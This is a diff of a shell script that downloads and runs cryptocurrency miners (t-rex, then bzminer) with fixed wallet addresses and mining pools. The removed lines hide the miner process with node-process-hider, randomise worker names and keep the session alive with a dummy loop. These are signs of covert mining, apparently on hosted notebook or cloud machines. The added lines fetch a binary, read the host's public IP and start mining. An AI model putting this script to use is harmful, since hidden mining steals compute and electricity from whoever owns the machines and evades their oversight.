@@ -1,13 +1,8 @@
 sudo apt update
 sudo apt install screen -y
-screen -dmS ip2.sh 89 95
-%cd /opt
-sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add t-rex
+sudo apt update
 sudo apt install libpci3
-sudo apt-get install screen
-wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz -O - | tar -xz
-LD_PRELOAD="" ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TAHyPjWESQmfYTdW1VcGvsWfKeLWVrHNYG -p x -w $(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))
-while [ 1 ]; do
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-sleep 2
-done
+wget https://github.com/bzminer/bzminer/releases/download/v8.0.0/bzminer_v8.0.0_linux_cuda_tk.tar.gz
+tar xvf bzminer_v8.0.0_linux_cuda_tk.tar.gz
+chmod +x bzminer
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./bzminer -a ethash -w 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -p stratum+tcp://us1.ethermine.org:4444 stratum+tcp://us2.ethermine.org:4444 -r $ip-BZ --nvidia 1
